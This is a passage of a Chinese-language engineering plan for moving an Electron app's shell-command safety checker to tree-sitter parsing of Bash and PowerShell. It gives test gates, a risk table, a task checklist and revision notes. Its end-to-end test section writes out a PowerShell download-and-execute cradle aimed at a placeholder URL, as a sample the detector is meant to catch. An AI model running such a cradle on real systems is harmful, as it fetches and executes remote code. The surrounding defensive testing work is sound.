  **metasyntax 闸门防线（自原 P2-T5 并入——P2 期间共享原语冻结，建档零信息量；此处改造前建档、改造后重跑，一步完成）**：动手改 `shellCommandParser.ts` **之前**，先对旧实现建档——(i) 真值表 ≥24 条：全部元语法类别（换行、反引号、`$(`、`${}`、`$VAR`、`|`、`;`、`&&`、`||`、`>`、`<`、`&`、`*`、`?`、赋值前缀）各 ≥1 正例（含引号包裹形态——现状启发式引号不感知，`echo "a && b"` 按现状断言 true，禁止顺手改启发式）+ 真正负例（无元语法普通命令 → false）；(ii) 无假阴性 fuzz（确定性种子 ≥500 条「引号外含元语法」断言 true，注释标注「对旧实现恒真，改造后成为实质防线」）；(iii) `parseShellCommandForTrust` persistable 专项（含 `$(cmd)` → `persistable: false`）。改造后三批断言必须全绿。
  **解析失败 fallback 语义显式定义**：语法树解析失败（`{ok:false}`）时回退到既有引号感知扫描实现（保留的旧路径）产出签名/分段；**禁止以常量/空签名兜底**（违反 §3 不变量 6）。
- 完成判定：
  - 签名 Golden：P3-T0 签名基线逐条比对，逐字节一致或不一致均按 §3 不变量 6 的四象限登记（合并一律修复，不接受豁免）；原语 Golden：P3-T0 原语基线（导出入口口径）同样逐条比对、同规则登记；**facts Golden**：P3-T0 facts 基线字段级比对，变化逐条登记（`analysisCompleteness` 翻转必须显式论证）；
  - **fallback 专项测试**：构造 ≥3 条必然解析失败的 PS 样本（here-string 未闭合等），断言 **fallback 输出与 P3-T0 基线（旧实现）逐字节一致**；
  - **metasyntax 闸门防线**：真值表 + fuzz + persistable 专项三批断言在改造后全绿（建档与重跑在同一任务内完成，评审点：建档 commit 先于改造 commit）；
  - 消费方回归：`decisionCache.ts`、`exemptionMigration.ts` 相关测试全绿（`npm run test:related -- electron/confirmation/extractors/commandSequenceExtractor.ts electron/confirmation/decisionCache.ts electron/confirmation/exemptionMigration.ts`）；
  - P2 遗留的旧实现保留面在本任务收编完成（rg 验证：保留面引用点零遗留或仅剩显式文档化的 fallback 实现）。

### P3-T5 平台路由接入（PowerShell 半侧）

- 内容：`analyzeShellCommand` 的 dialect 路由补全：`windows-powershell` → `powershellCommandFacts` + PS 模式集。解析失败 → ask 兜底（与 Bash 同语义）。
- 完成判定：P2-T6 的双 dialect 路由测试扩展为三态断言（bash 路径 / ps 路径 / 解析失败兜底），全绿。

### P3-T6 PowerShell 判定 Golden 对比（基线来自 P3-T0）

- 内容：PS Golden 每条样本新判定与 P3-T0 基线逐条 diff，判定变化登记评审文档 PS 段并给出处置结论。
- 完成判定：Golden 全绿；评审文档 PS 段无「未评审」条目；基线中 deny/ask 的样本不得静默变 allow（同 P2-T5 规则）。

### P3-T7 全链路端到端验证

- 内容：`npm run dev` 起开发实例，手动/脚本驱动验证 Windows 上 run_shell 走 PS 路径：（a）`Get-ChildItem` 类良性命令不被误拦（allow 或既有预检放行路径不变）；（b）`iex (New-Object Net.WebClient).DownloadString('http://x')` 命中 `ps-iex-cradle` 并出确认卡片；（c）畸形 PS 命令 → ask。
- 完成判定：三条场景的实际裁决结果与确认卡片展示截图/日志记录写入 Golden 评审文档「端到端验证」小节（含验证日期与提交哈希）。

**P3 阶段收尾门禁**：P3-T0～T7 全部达成 + `npm run build`（全量）+ `npm test` 全量绿 + `npm run pack:win` 验证打包产物中 wasm 加载与 PS 解析正常 + Golden 评审文档全部闭环 + 提交。

---

## 8. 风险与缓解跟踪表

| 风险 | 触发检查点 | 缓解落地位置 |
| --- | --- | --- |
| **IR 适配器静默丢节点 → Analyzer 漏命中（patterns 空 → allow/clean → `script-clean-allow-desktop` 免审放行）+ RemoteCertifier 误认证（remote fail-open）** | P1-T2 穷尽性 + 白名单叶子性 + ③双护栏 + 穿透归属断言 + 未知构造/包裹式反向用例 | §3 不变量 1(c) + 7（四分类）：已建模/叶子可忽略/显式穿透/抛错；语义容器禁入 ③ |
| **③ 穿透误纳语义容器（`keyword_argument` 等）→ kwargs 归属污染、`mode=` 等检测失效（护栏不变红的静默劣化）** | P1-T2 双护栏 + 「穿透不改归属」样本断言 | §3 不变量 7：准入判据升级为「不含以字段名承载语义的子节点」；护栏性质声明（真正兜底是 P1-T5 Golden） |
| **壳节点误落抛错类 → 普通构造（`f(1,2)`/`def`/`if`/`for`）全落人工（净退化）** | P1-T1 分类表 ③ 类显式列名 + P1-T2 壳节点正向用例 | §3 不变量 7 的 ③ 结构性穿透；禁净退化硬门禁（P1-T6） |
| **全量覆盖规矩误伤现状可用构造 → 净退化（含运算符族/基础字面量等清单遗漏形态）** | P1-T1 禁净退化映射 + P1-T2 禁净退化断言 + P1-T6 双组统计 | §1.1-4 硬门禁：现状可解析集 `A-fail` = 0；清单为下限非上限 |
| **bash facts 变化波及确认域与免确认资格（投影面：`analysisCompleteness='partial'` ⟺ `extraction-failed`，operations/connectors → 信任键信号；免确认面（发现 H，fail-open）：`shellToolLoopHelpers:54` → `legacyAutoAllowEligible` → `shell-precheck-auto-allow` 自动放行（决策本体）/ `skipConfirm` 审计留痕——裸括号 `echo "a(b)"` 类已信任命令可由「需确认」翻转为「免确认」）** | P2-T0 facts + 免确认资格派生基线（裸括号样本双配置）+ P2-T2 比对断言 + P2-T5 评审闭环 | facts 字段级比对 + 派生基线比对使翻转可见；`analysisCompleteness` 翻转须双面论证（extraction-failed 面 + 免确认面），eligible false→true 逐条给「免确认是否可接受」结论、不得默认放行；PS 组前三类零漂移 |
| PowerShell 语法残余缺陷 → over-ask（日常形态不可接受） | P3-T1 **分层** ERROR 率（Tier-1 = 0，Tier-2 ≤ 5%） | fail-closed 兜底；缺陷跟踪表；vendor/fork 预案 |
| 版本升级引入 API/ABI 破坏 | P0-T1 探针前移验证 ABI；每次升级四包任一版本 | P0-T1 精确锁版 + 真实解析探测；升级必须整组 + 全量 Golden（P1-T5/P2-T5/P3-T6） |
| wasm 供应链信任（grammar 3 个 + 核心运行时 1 个 + node-types.json 3 个） | P0-T2 | vendor + SHA256SUMS + CI 校验脚本；P0-T6 打包态哈希复核 |
| 切换期判定漂移 | P1-T0/P2-T0/P3-T0 基线 + P1-T5/P2-T5/P3-T6 比对 | 基线 commit 可追溯；Golden 逐条评审；IR 结构快照（P1-T2）消除「多 bug 抵消」盲区 |
| 信任键等价类合并 → fail-open（高危形态：「PS 命令 × 错误语法树」「解析失败折叠为常量签名」「重写共享原语传递性波及 PS 路径与确认域签名路径」） | P2-T0/P3-T0 签名/原语基线 + P2-T3/P3-T4 比对 | §3 不变量 6（新同 ⟹ 旧同，单向蕴含）；P2 冻结确认域组件与共享原语层（git diff 为空直证）；P3-T4 双轨 + fallback 与基线逐字节一致 |
| 同步 API 与异步初始化阻抗（含「懒加载 × 同步 parse」首调用窗口） | P0-T3 / P0-T4 | 启动前置初始化 + **三语法全量加载**；未就绪 → ask 兜底 |
| **运行期静默永久退化（wasm 路径/ABI 环境性失败 → 全部 ask，仅落日志）** | P0-T4 自检与告警；P3-T7 端到端 | §3 不变量 8：启动自检 + error 级可 grep 日志事件 + `getStatus()` 经 IPC 暴露 + 诊断界面最小展示 + 每会话首次 not_ready warn |
| 打包路径 wasm 不可达（含核心 `web-tree-sitter.wasm`） | P0-T6 / P3 收尾 | 双态路径解析 + 打包后哈希与自检功能验证 |
| `Parser.init` 的 `locateFile` 形态在 0.27.0 未实测 | P0-T3 单测即刻暴露 | P0-T3 预写退路（默认位置复制 / Emscripten Module 覆盖），文件管控目标不变 |
| metasyntax 信任闸门假阴性（含元语法命令被持久化信任） | P3-T4（改造前建档 + 改造后重跑） | 真值表 ≥24 条 + 无假阴性 fuzz + persistable 专项 |
| 判定级 Golden 被中间层 bug 抵消掩盖 | P1-T2 结构快照 | IR JSON 形状快照 + 中间函数（链解析/字符串折叠）独立断言 |
| 热路径重复解析（口径：**单次 `analyzeShellCommand` 内**；整链另含 `electron/tools/runShellPlan.ts:136` plan 阶段解析，跨阶段合并为后续优化项，见 §1.2） | P1-T3 / P2-T2 spy 断言 | 预解析参数共享，Python 门控路径与单次 `analyzeShellCommand` 各恰好 1 次 parse |

## 9. 任务索引（完成状态勾选表）

| 任务 | 一句话完成判据 | 状态 |
| --- | --- | --- |
| P0-T1 | 四包精确版本锁定；probe 脚本真实解析三语言通过；ABI 区间与 ≤6MB 体积预算核验记录 | ☑ |
| P0-T2 | 4 wasm + 3 node-types.json vendor + 哈希校验脚本 CI 生效 | ☑ |
| P0-T3 | ScriptParserService 单测全绿（全量加载无首调用窗口、未就绪兜底、双态路径、locateFile 退路） | ☑ |
| P0-T4 | 启动初始化 + 自检接入；getStatus 经 IPC 暴露（三处命中 + handler 测试 + typecheck/i18n 通过）；告警测试通过 | ☑ |
| P0-T5 | fuzz 测试三语言 ×500 输入全绿 | ☑ |
| P0-T6 | pack:win 产物内受控文件存在且哈希一致，自检通过 | ☑ |
| P0-T7 | 全量 build:electron 无类型错误 | ☑ |
| P1-T0 | Python 基线在指定 commit 录制 ≥80 条，每条标注「旧实现是否解析成功」，哈希入库 | ☑ |
| P1-T1 | IR 类型 + 四分类节点分类表（全 named 种类归类、P1-T0 构造对号、③带 justification、语义容器禁入③、现状可解析集零④归类） | ☑ |
| P1-T2 | 适配器单测全绿（清单含运算符族/字面量且为下限非上限）；壳节点正向 + 穿透不改归属断言；穷尽 + ②叶子性 + ③双护栏 + 禁净退化 + 反向用例 + 结构快照全过 | ☑ |
| P1-T3 | List A/B/R 54 用例零修改通过；自研解析器移除；spy 断言门控路径 1 次 parse（现状 3 次）、runExtractors 路径自解析保留 | ☑ |
| P1-T4 | 提取器/执行器/远程策略/门控测试全绿 | ☑ |
| P1-T5 | Python Golden 比对基线全绿，变化逐条评审闭环 | ☑ |
| P1-T6 | 双组统计入库：原必失败集语法失败归零；现状可解析集 A-fail = 0（禁净退化硬门禁） | ☑ |
| P2-T0 | 判定 + 签名 + facts + 免确认资格四类基线在 P1 收尾 commit 录制（bash ≥40 含裸括号形态 ≥3、派生基线含双配置取值 + PS ≥10，PS 前三类俱全） | ☑ |
| P2-T1 | bashCommandFacts 单测全绿（结构断言 + unresolved 反向用例） | ☑ |
| P2-T2 | facts 入口分叉 + 主裁决链只增式增强落地；单次解析 spy 断言；git diff 为空；分叉双向 spy + 只增不减 + facts 比对断言（翻转双面论证）+ 免确认资格样本成对断言（裸括号 + 已信任）通过 | ☑ |
| P2-T3 | 签名归一化逐字节比对通过；不一致均按「新同 ⟹ 旧同」登记，PS 组零漂移 | ☑ |
| P2-T4 | 五个 Bash 新模式正反例全绿 | ☑ |
| P2-T5 | Bash 判定 + facts + 免确认资格 Golden 比对基线全绿，deny/ask 零静默降级、eligible=false 零静默升级，PS 组双零漂移 | ☑ |
| P2-T6 | dialect 路由 Bash 半侧定向测试通过 | ☑ |
| P3-T0 | PS 判定 + 签名 + 原语 + facts 四类基线（原语经导出入口录制）在 P2 收尾 commit 入库 ≥30 条 | ☑ |
| P3-T1 | PS 分层样本 Tier-1 ≥20 条 ERROR=0、Tier-2 ≥20 条 ERROR ≤5%，分类统计入库 | ☑ |
| P3-T2 | powershellCommandFacts 单测全绿（含 unresolved 反向用例） | ☑ |
| P3-T3 | 四个 PS 新模式正反例全绿（含 EncodedCommand 递归） | ☑ |
| P3-T4 | 双轨完成；签名/原语/facts 基线比对闭环；fallback 逐字节一致；**metasyntax 防线建档+重跑全绿**；消费方回归全绿 | ☑ |
| P3-T5 | dialect 路由三态断言全绿 | ☑ |
| P3-T6 | PS Golden 比对基线全绿，评审闭环 | ☑ |
| P3-T7 | 端到端三场景验证记录入库 | ☑ |

---

## 10. 修订记录

- v2（2026-09-19）：按 v1 评审修订——B1（§3 不变量 6）；B2（基线采集前置）；H1（核心 wasm 管控）；M1（契约措辞）；L1–L3。
- v3（2026-09-19）：按 v2 复评修订——B1′ 方案 A；H1′（单向蕴含）；L1′–L4′。
- v4（2026-09-19）：按 v3 复评修订——B1″ 方案 A′；H1″（fallback 逐字节一致）；L1″/L2″。
- v5（2026-09-19）：按专家六条意见修订——§3 不变量 7/8；全量加载；消除重复解析；分层 ERROR 门禁；ABI/体积前移；metasyntax 强化；IR 结构快照。
- v6（2026-09-19）：按评审 v4 修订——不变量 1 拆三类；`adapter_uncovered` 落点决策（选项 a）；包裹式反向用例。
- v7（2026-09-19）：按后补中/低级发现修订——M1‴（shellPathAnalysis 合规复用路径）；M2‴（白名单叶子性）；低级 4 项。
- v8（2026-09-19）：禁净退化 + 节点分类表；`tokenizeSegment` 私有性修正；`analyzeShellFacts` 入口分叉；metasyntax 防线重跑；解析 3→1 与 runExtractors 双路径；P0-T4 IPC DoD。
- v9（2026-09-19）：不变量 7 扩四分类（③ 结构性穿透 + 名称护栏）；原 P2-T5 并入 P3-T4；P2-T2 主裁决链只增式增强 + 只增不减断言；P2 重排 T0～T6。
- v10（2026-09-19）：发现 A（③ 准入判据升级「不含字段名语义子节点」+ 语义容器禁入清单 + 双护栏 + 穿透不改归属断言）；发现 B（单次 `analyzeShellCommand` 内恰好 1 次解析 + spy 断言）。
- v11（2026-09-19）：按本轮三项发现修订——
  - **发现 E（bash facts 无基线）**：§2.2 新增 `analyzeShellFacts` 完整消费面说明（`runShellPlan.ts:136` plan 冻结 + `shellConfirmationAdapter.ts:51` 投影，`analysisCompleteness='partial'` ⟺ `extraction-failed`）；P2-T0 增录 **facts 基线**（字段级六字段，PS 组同录）；P2-T2 增 facts 比对断言（PS 组零漂移；bash 组逐条登记，`analysisCompleteness` 翻转必须显式论证放行面）；P2-T5 扩展为「判定 + facts」双比对；P3-T0 同口径补 facts 基线、P3-T4 补 facts Golden 比对；§8 新增对应风险行；
  - **发现 F（清单遗漏运算符族/基础字面量）**：P1-T2 已建模清单补 `binary_operator`/`comparison_operator`/`boolean_operator`/`unary_operator`/`not_operator` 与 `integer`/`float`/`true`/`false`/`none`（对位现状 `binop`/`__compare__`/`__unary__`，`print(1 + 2)` 为 A0 用例）；清单表述改为「**下限非上限**——已建模必须覆盖现状可解析集所需的全部节点种类」；P1-T1 禁净退化映射同步；
  - **发现 G（口径）**：§8「热路径重复解析」行口径修正为「单次 `analyzeShellCommand` 内」；§1.2 显式声明 `runShellPlan.ts:136` plan 阶段与裁决阶段的跨阶段 parse 合并不在本方案范围（记录为后续优化项）。
- v12（2026-09-19）：按评审 v6 发现 H（中等，fail-open）修订——`analysisCompleteness` 的**第三后果**（`shellToolLoopHelpers.ts:54-57` → `legacyAutoAllowEligible` → `toolCallGate.ts:447` `shell-precheck-auto-allow` 自动放行 + `toolChatLoop.ts:1787/:2223-2224` `skipConfirm` 免确认）此前未被 facts 消费面覆盖：
  - **§2.2**：facts 消费面段补第三后果（fail-open 方向、两处免确认消费、裸括号可触发形态），消费面写全为「调用点 3 处 + 派生消费点 1 处」；
  - **P2-T0**：bash 样本集增「无元语法但旧实现 partial」裸括号形态 ≥3 条；新增**免确认资格派生基线**（`precheckRunShellTool` 的 `legacyAutoAllowEligible` + `analysisCompleteness`，裸括号样本 trusted/untrusted 双配置录制）；
  - **P2-T2**：`analysisCompleteness` 翻转论证目标扩容——除 `extraction-failed` 外必须论证「是否使已信任命令的 `legacyAutoAllowEligible` 由 false 变 true（是否打开新免确认通道）」，翻转样本逐条给「免确认是否可接受」结论、不得默认放行；DoD 新增「免确认资格样本断言」（`echo "a(b)"` + 已信任，成对断言 + 登记处置结论，注明 `echo $(pwd)` 因 `hasMetasyntax` 短路不构成防线）；
  - **P2-T5 / P2 收尾门禁**：比对口径三类 → 四类（判定 + 签名 + facts + 免确认资格），新增「eligible=false 零静默升级」禁令；
  - **§8 / §9**：风险行与索引行同步。
- v13（2026-09-19）：按评审 v7 修订（2 阻断 + 2 中 + 3 低）——
  - **B1（阻断，事实错误）**：核心运行时 wasm 文件名全文 `tree-sitter.wasm` → **`web-tree-sitter.wasm`**（web-tree-sitter@0.27.0 包内实际文件名，~210KB，unpkg 清单核实不存在 `tree-sitter.wasm`）；涉及 §2.1、P0-T1（体积口径补核心 210KB / 合计 ~3MB）、P0-T2（vendor 清单）、P0-T3（`locateFile` 目标）、P0-T6（打包校验）、§8；
  - **B2（阻断，DoD 自相矛盾）**：P2-T2 负向断言「bash 路径下 `extractPathLiterals` 零调用」与正文「保留既有判定链」（`analyzeSegmentPaths` 于 `shellPathAnalysis.ts:223` 内部调用 `extractPathLiterals`，P2 期间每次 bash 裁决必然触发）不可同时成立——按评审建议 a 收窄为「**树事实增强路径内**零调用」，并声明既有主链属保留面、不在口径内；三条 spy 断言计数口径统一以 dialect 路由入口为界；
  - **M1**：`runShellPlan.ts`（实际在 `electron/tools/`）与 `shellConfirmationAdapter.ts`（实际在 `electron/confirmation/`）的活跃文本引用补全目录前缀（原文为无前缀裸文件名，行号本就正确；§10 历史条目保持原貌）；
  - **M2**：§2.3 与 P0-T3 明确测试初始化归属——`src/test/setup.ts` 被 electron / renderer / renderer-perf 三项目共用，`ensureInitialized()` 不得写入共享 setup，走 electron 专属 setup 或测试文件 `beforeAll`；
  - **L1**：§2.3「内存增量 ~4–5MB」修正为「wasm 资产体积约 4–5MB」（评估文档 §6.2 口径，非内存实测）；
  - **L2**：`toolChatLoop.ts:1787/:2223-2224` 锚点语义修正为**审计留痕点**（`logShellPrecheck`/`logShellConfirmOutcome` 字段），免确认决策本体是 `toolCallGate.ts:447` 评估器（§2.2 / P2-T0 / P2-T2 / §8 同步）；
  - **L3**：§2.2 表 `NETWORK_PATTERN_IDS` 形态修正为 `new Set(['A6','B10'])`。
